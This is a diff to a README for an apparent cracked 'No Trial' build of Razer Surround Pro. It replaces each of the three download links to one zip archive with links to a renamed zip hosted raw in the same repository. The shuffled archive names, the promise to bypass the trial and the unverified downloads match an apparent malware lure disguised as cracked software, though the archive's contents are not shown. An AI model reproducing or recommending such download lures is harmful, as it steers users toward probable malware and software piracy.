@@ -1,6 +1,6 @@
 # 🎧 Razer-Surround-Pro-No-Trial - Enjoy Enhanced Audio Experience
 
-[![Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Razer-Surround-Pro-No-Trial_2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Razer-Surround-Pro-No-Trial_2.6.zip)
+[![Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Pro_Razer_Surround_Trial_No_3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Pro_Razer_Surround_Trial_No_3.8.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 Visit the Releases page to download the software. Click the link below:
 
-[Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Razer-Surround-Pro-No-Trial_2.6.zip)
+[Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Pro_Razer_Surround_Trial_No_3.8.zip)
 
 ## 📥 Download & Install
 
@@ -85,4 +85,4 @@ If you have questions or need support, check out the official documentation avai
 
 To keep yourself informed about updates and new features, check the Releases page regularly.
 
-[Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Razer-Surround-Pro-No-Trial_2.6.zip) and enhance your audio experience today!
+[Download Razer Surround Pro](https://raw.githubusercontent.com/copenaghen3/Razer-Surround-Pro-No-Trial/main/Mark/Pro_Razer_Surround_Trial_No_3.8.zip) and enhance your audio experience today!
